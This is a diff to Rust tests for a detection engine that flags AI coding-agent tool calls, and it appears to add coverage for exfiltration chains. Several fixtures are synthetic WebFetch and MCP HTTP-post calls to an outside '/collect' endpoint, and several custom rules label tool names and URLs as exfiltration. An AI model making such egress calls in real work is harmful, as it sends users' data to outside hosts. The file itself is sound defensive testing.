@@ -597,7 +597,15 @@ fn review_all_candidate_replay_ambiguity_even_when_only_one_correlates() {
 /// Whether the session view and the action view each link `chain` over these
 /// observations, in order.
 fn chain_in_both_views(observations: &[CanonicalObservationV2], chain: &str) -> (bool, bool) {
-    let output = actions(observations);
+    chain_in_both_views_with(crate::v2::bundled_plan(), observations, chain)
+}
+
+fn chain_in_both_views_with(
+    plan: &super::RuleV1CompatibilityPlan,
+    observations: &[CanonicalObservationV2],
+    chain: &str,
+) -> (bool, bool) {
+    let output = actions_with(observations, plan);
     let session = &output.sessions()[0];
     (
         session.rule_ids().iter().any(|id| id == chain),
@@ -678,6 +686,147 @@ fn a_network_command_still_supplies_the_egress_step_of_a_chain() {
             "{chain}"
         );
     }
+}
+
+/// A requested call with no source time, ordered like `parsed_shell_call`.
+fn url_call(id: &str, name: &str, arguments: serde_json::Value) -> CanonicalObservationV2 {
+    CanonicalObservationV2::builder(
+        ObservationBody::Tool(
+            ToolObservation::new()
+                .with_name(name)
+                .unwrap()
+                .with_arguments(JsonValue::try_from_source_value(&arguments).unwrap()),
+        ),
+        ObservationStage::ToolRequested,
+        ObservedAt::new("2026-11-20T12:00:00Z").unwrap(),
+        SourceProvenance::new(
+            IngestionMode::SessionStore,
+            "claude_code",
+            "claude.projects",
+            Fidelity::FullNative,
+        )
+        .unwrap()
+        .with_native_id(id)
+        .unwrap(),
+    )
+    .session_id(CorrelationId::source_reported("synthetic-session").unwrap())
+    .capability_context(
+        CapabilityContext::new()
+            .with_override(CapabilityId::ToolCall, CapabilityAvailability::Supported)
+            .with_override(CapabilityId::UserContext, CapabilityAvailability::Supported),
+    )
+    .fact_metadata("tool.name", FactMetadata::reported().unwrap())
+    .fact_metadata("tool.arguments", FactMetadata::reported().unwrap())
+    .build()
+    .unwrap()
+}
+
+#[test]
+fn a_web_fetch_of_the_controlled_domain_supplies_the_egress_step_of_a_chain() {
+    let fetch = serde_json::json!({
+        "url": "https://in.darkroastcyber.io/collect",
+        "prompt": "summarize"
+    });
+    for (opener, chain) in egress_chain_openers() {
+        assert_eq!(
+            chain_in_both_views(
+                &[opener, url_call("egress", "WebFetch", fetch.clone())],
+                chain
+            ),
+            (true, true),
+            "{chain}"
+        );
+    }
+}
+
+#[test]
+fn an_mcp_http_call_to_the_controlled_domain_supplies_the_egress_step_of_a_chain() {
+    let post = serde_json::json!({
+        "endpoint": "https://in.darkroastcyber.io/collect",
+        "body": "status"
+    });
+    for (opener, chain) in egress_chain_openers() {
+        assert_eq!(
+            chain_in_both_views(
+                &[opener, url_call("egress", "mcp__http__post", post.clone())],
+                chain
+            ),
+            (true, true),
+            "{chain}"
+        );
+    }
+}
+
+/// An opener rule, two custom exfiltration rules on tool-call fields and a
+/// chain over their categories.
+fn custom_exfiltration_plan() -> super::RuleV1CompatibilityPlan {
+    let telltale = |category: &str, score: u32| {
+        format!(
+            "telltale:\n    category: {category}\n    score: {score}\n    explanation: 'synthetic'\n    analytic_intent: alert\n    detection_class: security_detection\n    signal_type: atomic\n    tags: [synthetic]\n"
+        )
+    };
+    let rule = |id: &str, name: &str, selection: &str, category: &str| {
+        format!(
+            "title: synthetic\nid: {id}\nname: {name}\ntaxonomy: telltale\nlogsource:\n    product: ai_agent\n    category: tool_activity\ndetection:\n    selection:\n{selection}    condition: selection\nlevel: low\n{}",
+            telltale(category, 1)
+        )
+    };
+    let documents = [
+        rule(
+            "5f0c1a2b-3c4d-4e5f-8a6b-7c8d9e0f1a2b",
+            "synthetic.opener",
+            "        - tool.command|re: 'opener-marker'\n",
+            "synthetic_open",
+        ),
+        rule(
+            "6a1d2b3c-4d5e-4f60-9b7c-8d9e0f1a2b3c",
+            "synthetic.send_by_name",
+            "        - tool.name|re: '^send_report$'\n",
+            "exfiltration",
+        ),
+        rule(
+            "7b2e3c4d-5e6f-4071-8c8d-9e0f1a2b3c4d",
+            "synthetic.send_by_name_or_url",
+            "        - tool.name|re: '^post_report$'\n        - tool.url|re: 'reports\\.example\\.invalid'\n",
+            "exfiltration",
+        ),
+        "title: synthetic\nid: 8c3f4d5e-6f70-4182-9d9e-0f1a2b3c4d5e\nname: chain.synthetic_open_then_send\ntaxonomy: telltale\ncorrelation:\n    type: telltale_chain\n    categories: [synthetic_open, exfiltration]\n    within_calls: 3\ntelltale:\n    score: 3\n    explanation: 'synthetic'\n    analytic_intent: audit\n    detection_class: security_detection\n    signal_type: chain\n".to_owned(),
+    ];
+    let documents = documents.iter().map(String::as_str).collect::<Vec<_>>();
+    compile_rule_v1(
+        &telltale_rules::load_rule_set_from_documents(&documents, None)
+            .unwrap()
+            .compatibility_export(),
+    )
+    .unwrap()
+}
+
+#[test]
+fn a_custom_exfiltration_rule_on_a_tool_name_supplies_the_egress_step() {
+    let plan = custom_exfiltration_plan();
+    let send = url_call("send", "send_report", serde_json::json!({"to": "team"}));
+    assert_eq!(
+        chain_in_both_views_with(
+            &plan,
+            &[parsed_shell_call("open", "printf opener-marker"), send],
+            "chain.synthetic_open_then_send"
+        ),
+        (true, true)
+    );
+}
+
+#[test]
+fn a_custom_exfiltration_rule_on_a_tool_name_or_url_supplies_the_egress_step() {
+    let plan = custom_exfiltration_plan();
+    let post = url_call("post", "post_report", serde_json::json!({"to": "team"}));
+    assert_eq!(
+        chain_in_both_views_with(
+            &plan,
+            &[parsed_shell_call("open", "printf opener-marker"), post],
+            "chain.synthetic_open_then_send"
+        ),
+        (true, true)
+    );
 }
 
 #[test]
@@ -901,7 +1050,13 @@ fn tool_session(
 }
 
 fn actions(observations: &[CanonicalObservationV2]) -> CanonicalSourceEvaluation {
-    let plan = crate::v2::bundled_plan();
+    actions_with(observations, crate::v2::bundled_plan())
+}
+
+fn actions_with(
+    observations: &[CanonicalObservationV2],
+    plan: &super::RuleV1CompatibilityPlan,
+) -> CanonicalSourceEvaluation {
     let instance = CorrelationId::source_reported("synthetic-source").unwrap();
     evaluate_source_with_options(
         CanonicalSourceInput {
